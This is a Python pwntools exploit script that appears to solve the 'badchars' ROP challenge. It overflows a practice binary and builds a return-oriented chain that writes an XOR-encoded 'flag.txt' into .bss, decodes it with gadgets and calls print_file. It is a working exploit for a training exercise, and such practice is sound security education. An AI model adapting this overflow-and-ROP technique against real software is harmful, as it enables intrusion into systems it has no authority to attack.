#!/bin/python3

from pwn import *

context.clear(arch='amd64')
filename = './badchars'

elf = ELF(filename)
io = process(filename)

# variables

flag_string = b'flce,tzt'

# gadgets

r = ROP(elf)

mov     = p64(0x400634)         # mov qword [r13], r12; retn;
xor     = p64(0x400628)         # xor byte [r15], r14b; retn;
pop_r12 = p64(r.r12.address)    # 0x40069c: pop r12, pop r13, pop r14, pop r15, retn;
pop_r14 = p64(r.r14.address)    # 0x4006a0: pop r14, pop r15, retn;
bss  = elf.bss()

# bad chars 'x' 'g' 'a' '.'
# xor'd string 'flce,tzt'
# 0x02 key at indexes [2,3,4,6]

r.raw(cyclic(40))

# write & xor index 2
r.raw(pop_r12)          # pop r12, r13, r14, r15
r.raw(flag_string)      # load string
r.raw(p64(bss))         # string location
r.raw(0x2)              # xor key
r.raw(p64(bss+2))       # xor index 2 location (1 byte)
r.raw(mov)              # write string
r.raw(xor)              # xor index 2

# xor index 3
r.raw(pop_r14)          # pop r14, r15
r.raw(0x2)              # xor key
r.raw(p64(bss+3))       # xor index 3
r.raw(xor)

# xor index 4
r.raw(pop_r14)          # pop r14, r15
r.raw(0x2)              # xor key
r.raw(p64(bss+4))       # xor index 4
r.raw(xor)

# xor index 6
r.raw(pop_r14)          # pop r14, r15
r.raw(0x2)              # xor key
r.raw(p64(bss+6))       # xor index 6
r.raw(xor)

# call print_file
r.call('print_file', [bss])

payload = r.chain()

io.recvuntil('>')
io.sendline(payload)
io.recvuntil('!\n')
flag = io.recvline().decode().rstrip()
log.success("Flag: {}".format(flag))
